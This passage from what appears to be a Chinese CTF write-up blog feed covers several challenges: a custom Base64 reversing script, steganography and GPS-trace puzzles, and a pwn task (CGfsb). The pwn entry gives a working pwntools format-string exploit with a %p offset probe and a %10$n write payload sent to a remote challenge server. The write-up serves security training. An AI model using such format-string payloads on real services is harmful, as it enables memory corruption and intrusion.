punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp_str_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># print(temp_str_list)</span>        <span class="token keyword">if</span> nums<span class="token punctuation">:</span>            temp_str_list <span class="token operator">=</span> temp_str_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span> <span class="token operator">-</span> nums<span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> temp_str_list<span class="token punctuation">:</span>            outputs <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    outputs <span class="token operator">+=</span> nums <span class="token operator">*</span> <span class="token string">'='</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_base64_decode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 将字符串转化为2进制</span>    bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token string">'='</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>6&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(bin_str)</span>    <span class="token comment"># 输出的字符串</span>    outputs <span class="token operator">=</span> <span class="token string">""</span>    nums <span class="token operator">=</span> inputs<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>        temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>        <span class="token comment"># print(temp_str)</span>        <span class="token comment"># 补足8位字节</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp_str <span class="token operator">=</span> temp_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> nums <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>        <span class="token comment"># 将四个6字节的二进制转换为三个字符</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            outputs <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"     可更换码表的 Base64 加解密系统       "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>select <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"是否更换加密的码表? (y or n) 你的选择: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> select <span class="token operator">==</span> <span class="token string">"y"</span> <span class="token keyword">or</span> select <span class="token operator">==</span> <span class="token string">"yes"</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"在这里输入码表: "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....done, 已更改!"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"码表未做更改!"</span><span class="token punctuation">)</span>num <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"选择要进行的操作? (1:加密 or 2:解密) 你的选择: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"1:加密"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入明文以加密: "</span><span class="token punctuation">)</span>    my_base64_encode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token keyword">elif</span> num <span class="token operator">==</span> <span class="token string">"2"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"2:解密"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入密文以解密: "</span><span class="token punctuation">)</span>    my_base64_decode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....bye"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{380605c6-7123-4f71-b573-601e8c4457b4}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2022%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One9.png" alt="2022第七届楚慧杯-Level_One9.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】CGfsb</title>
      <link href="/posts/954af5bc.html"/>
      <url>/posts/954af5bc.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li>利用格式化字符串漏洞修改段上的值</li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/e41a0f684d0e497f87bb309f91737e4d">【攻防世界】CGfsb</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看文件信息：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CGfsb1.png" alt="攻防世界-CGfsb1.png"></p><p>32位 小端序，开启了金丝雀、栈不可执行</p><p>尝试执行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CGfsb2.png" alt="攻防世界-CGfsb2.png"></p><p>在 IDA 中分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CGfsb3.png" alt="攻防世界-CGfsb3.png"></p><p>在 <code>printf(s)</code> 处存在格式化字符串漏洞，当 <code>pwnme == 8</code> 时 cat flag，跟进 <code>pwnme</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CGfsb4.png" alt="攻防世界-CGfsb4.png"></p><p><code>pwnme</code> 位于 bss 段上</p><p><code>buf</code> 可写入的大小为 0xA，跟进 <code>buf</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CGfsb5.png" alt="攻防世界-CGfsb5.png"></p><p>长度不够溢出</p><p>因此本题关键在于利用输入的 <code>s</code> 构造 <code>printf(s)</code> 的格式化字符串漏洞</p><p>要利用输入修改 <code>pwnme</code> 的值，首先得知道输入进去的数据存在栈上的哪个位置，然后才能将这个位置和 <code>pwnme</code> 的地址对应起来</p><p>获取输入数据在栈中的偏移量：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"leave your message please:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CGfsb6.png" alt="攻防世界-CGfsb6.png"></p><p>可以看到，构造 <code>AAAA_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p</code> 作为参数传入 <code>printf()</code></p><p><code>AAAA</code> 的值 <code>0x41414141</code> 出现在输出的第十个地址，因此我们的输入在栈上的偏移量为 10</p><p>由于没有开启 PIE，在 IDA 中可获得 <code>pwnme</code> 的地址：<code>0x0804A068</code></p><p>接下来直接写脚本即可</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span>pwnme_addr <span class="token operator">=</span> <span class="token number">0x0804A068</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CGfsb/CGfsb"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">54712</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''    # 用于获取输入的数据在栈上的偏移量    io.recvuntil("please tell me your name:\n")    io.sendline("1")    io.recvuntil("leave your message please:\n")    io.sendline("AAAA_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p")    '''</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"leave your message please:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>pwnme_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> <span class="token string">b'%10$n'</span><span class="token punctuation">)</span>    <span class="token comment"># %10$n 是将 %n 之前打印的字符的数量放入指定地址内</span>    <span class="token comment"># 而pwnme 需要等于 8，p32(0x0804A068) 打包后是 4 个字节</span>    <span class="token comment"># 所以还需要填充 4 个字节的垃圾数据，凑成打印 8 个字节</span>    <span class="token comment"># 指定的地址是偏移量为 10 的栈空间所指向的地址空间</span>    <span class="token comment"># 所以 pwnme 所在的空间内容就被更改为之前所输出的字符数量 8</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>cyberpeace{625aab77a3d7f4bbf120abf06c722ddb}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CGfsb7.png" alt="攻防世界-CGfsb7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CatCTF】CatCatCat</title>
      <link href="/posts/cb1f6590.html"/>
      <url>/posts/cb1f6590.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>在 kali 中分析图像的隐藏内容</mark></p></li><li><p>熟悉 <mark>Rabbit加解密</mark>、<mark>Base91加解密</mark>、<mark>Ook!语言加解密</mark> 的特点</p><ol><li><a href="http://www.esjson.com/rabbitEncrypt.html">Rabbit加解密(ES JSON在线工具)</a></li><li><a href="http://www.hiencode.com/base91.html">CTF在线工具-在线base91编码</a></li><li><a href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook! Encoding</a></li></ol></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=e395fd1e-8d98-11ed-ab28-000c29bc20bf&task_category_id=1">【CatCTF】CatCatCat</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>下载文件得到一张 .jpg 图和一个 .txt 文本文件</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-CatCatCat1.png" alt="CatCTF-CatCatCat1.png"></p><p>图片最底下挡住了一块，在 kali 下查看是否有隐藏内容</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-CatCatCat2.png" alt="CatCTF-CatCatCat2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-CatCatCat3.png" alt="CatCTF-CatCatCat3.png"></p><p>具体查看 flag 字符串：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-CatCatCat4.png" alt="CatCTF-CatCatCat4.png"></p><p>在文件中发现字符串：<code>passwordis..catflag..]</code></p><p>根据文本内容，发现很多 <code>&#39;+&#39;</code>，并且开头为：<code>U2FsdGVkX1</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-CatCatCat5.png" alt="CatCTF-CatCatCat5.png"></p><p>这是 <em><strong>Rabbit 加密</strong></em> 的特点，并且 Rabbit 加解密会使用到密钥，猜测密钥就是 <code>catflag</code></p><p><a href="http://www.esjson.com/rabbitEncrypt.html">Rabbit加解密(ES JSON在线工具)</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-CatCatCat6.png" alt="CatCTF-CatCatCat6.png"></p><p>将结果进行 Base91 解密：<a href="http://www.hiencode.com/base91.html">CTF在线工具-在线base91编码</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-CatCatCat7.png" alt="CatCTF-CatCatCat7.png"></p><p>发现结果中存在很多 <code>&#39;.&#39;</code>、<code>&#39;!&#39;</code>、<code>&#39;?&#39;</code>，这是 <em><strong>Ook 语言加密</strong></em> 的特点：<a href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook! Encoding</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-CatCatCat8.png" alt="CatCTF-CatCatCat8.png"></p><p>得到 flag：CATCTF{Th1s_V3ry_cute_catcat!!!}</p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>CATCTF{Th1s_V3ry_cute_catcat!!!}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CatCTF】miao~</title>
      <link href="/posts/f61a7053.html"/>
      <url>/posts/f61a7053.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>熟悉<mark>图像隐写</mark>、<mark>音频隐写</mark>，学会使用 <mark>Audacity 和 DeepSound</mark></p></li><li><p>了解<mark>兽语解密</mark></p></li><li><p><mark>不要太相信 binwalk 的隐藏文件检测结果</mark>，有时候不准确，先用 foremost 尝试分离</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/01ba54b9-5a1c-40f3-8fb5-19f1abf9f97a.zip">【CatCTF】miao~</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>解压得到一张 jpg 图片</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-miao~1.png" alt="CatCTF-miao~1.png"></p><p>在 Ubuntu 下查看图片隐藏信息，查看字符串未发现有用信息：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-miao~2.png" alt="CatCTF-miao~2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-miao~3.png" alt="CatCTF-miao~3.png"></p><p>用 <code>binwalk</code> 检测是否含有隐藏文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-miao~4.png" alt="CatCTF-miao~4.png"></p><p><em>这里踩坑了。。。不要太相信 binwalk 的分析结果，这里显示没有其他隐藏文件，但其实是有的</em></p><p>在 Winhex 下可以看到包含了 wav：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-miao~5.png" alt="CatCTF-miao~5.png"></p><p>用 <code>foremost</code> 分离，得到几个文件夹：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-miao~6.png" alt="CatCTF-miao~6.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-miao~7.png" alt="CatCTF-miao~7.png"></p><p>其中，jpg 文件夹内时一张原图，wav 文件夹内有一段音频：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-miao~8.png" alt="CatCTF-miao~8.png"></p><p>用 <code>Audacity</code> 打开，并查看频谱图：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-miao~9.png" alt="CatCTF-miao~9.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-miao~10.png" alt="CatCTF-miao~10.png"></p><p>发现 <code>&quot;CatCTF&quot;</code> 字样</p><p>由于只给了一段猫叫的音频，猜测可能跟音频内容有关，可能是音频的解密密码</p><p>利用音频隐写工具 <code>DeepSound</code> 打开：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-miao~11.png" alt="CatCTF-miao~11.png"></p><p>但是发现需要密码</p><p>尝试了文件名，不对，最后用音频的频谱图内发现的 CatCTF 作为密码成功</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-miao~12.png" alt="CatCTF-miao~12.png"></p><p>得到一个 flag.txt 文件，打开发现是猫叫声：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-miao~13.png" alt="CatCTF-miao~13.png"></p><p>利用<mark>兽语解密</mark>：<a href="http://hi.pcmoe.net/roar.html">兽音译者&#x2F;兽语加密 - PcMoe!</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-miao~14.png" alt="CatCTF-miao~14.png"></p><p>得到 flag</p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>CatCTF{d0_y0u_Hate_c4t_ba3k1ng_?_M1ao~}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】Banmabanma</title>
      <link href="/posts/67e88a0e.html"/>
      <url>/posts/67e88a0e.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li>要对<mark>条形码</mark>、<mark>二维码</mark>等敏感：<a href="https://online-barcode-reader.inliteresearch.com/">图形码在线阅读</a></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/f018351ca6c64ceb8a98c9da9f29c9cd.rar">【攻防世界】Banmabanma</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>解压后得到一个 .png 文件</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Banmabanma1.png" alt="攻防世界-Banmabanma1.png"></p><p>用 exeinfo PE 查看文件，确实是 png 图片，文件类型没有做修改</p><p>用 010editor 查看二进制内容，没有搜索到与 flag 有关的字符串</p><p>在 kali 中分析图片隐写内容无果，发现没有隐藏内容</p><p>发现图中斑马身上的黑色竖条纹，有点像条形码</p><p>利用条形码在线阅读：<a href="https://online-barcode-reader.inliteresearch.com/">图形码在线阅读</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Banmabanma2.png" alt="攻防世界-Banmabanma2.png"></p><p>识别成功：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Banmabanma3.png" alt="攻防世界-Banmabanma3.png"></p><p>得到 flag</p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{TENSHINE}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CatCTF】CatchCat</title>
      <link href="/posts/263e5db2.html"/>
      <url>/posts/263e5db2.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>根据地图 GPS 数据复现轨迹</mark></p><ol><li>利用 NMEA 转 KML 可视化还原 GPS 轨迹（<a href="https://www.h-schmidt.net/NMEA/">NMEA 转 KML</a>）</li><li>将 KML 数据可视化为 GPS 轨迹（<a href="https://mygeodata.cloud/converter/">KML 可视化轨迹</a>）</li></ol></li><li><p><mark>GPS 数据格式</mark>：<a href="https://www.lehoon.cn/orther/2017/04/25/gnss-gpgga-formet.html">GPGGA格式详解 | 豌豆荚博客 (lehoon.cn)</a></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=36f991a4-8d9a-11ed-b5da-000c296d9df6&task_category_id=1">【CatCTF】CatchCat</a></p><hr><h1 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h1><p>下载文件，是一个 .txt 文本，根据题目提示，以及文本数据的特点，给出的应该是 GPS 数据</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-CatchCat1.png" alt="CatCTF-CatchCat1.png"></p><p><a href="https://www.lehoon.cn/orther/2017/04/25/gnss-gpgga-formet.html">GPGGA格式详解 | 豌豆荚博客 (lehoon.cn)</a></p><p>了解得知，该文本内容是 GPS 的 NMEA 格式轨迹数据，将数据还原为轨迹即可</p><p>利用 NMEA 转 KML 可视化还原 GPS 轨迹：<a href="https://www.h-schmidt.net/NMEA/">NMEA 转 KML</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-CatchCat2.png" alt="CatCTF-CatchCat2.png"></p><p>将 KML 数据可视化为 GPS 轨迹：<a href="https://mygeodata.cloud/converter/">KML 可视化轨迹</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-CatchCat3.png" alt="CatCTF-CatchCat3.png"></p><p>根据轨迹可得 flag：CatCTF{GPS_M1ao}</p><hr><h1 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h1><p>通过写脚本提取数据还原 GPS 轨迹：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltdata <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'CatchCat.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> line <span class="token keyword">in</span> data<span class="token punctuation">:</span>  <span class="token keyword">if</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>d1<span class="token punctuation">,</span> d2 <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">float</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">]</span><span class="token punctuation">)</span>x<span class="token punctuation">.</span>append<span class="token punctuation">(</span>d1<span class="token punctuation">)</span>y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>d2<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 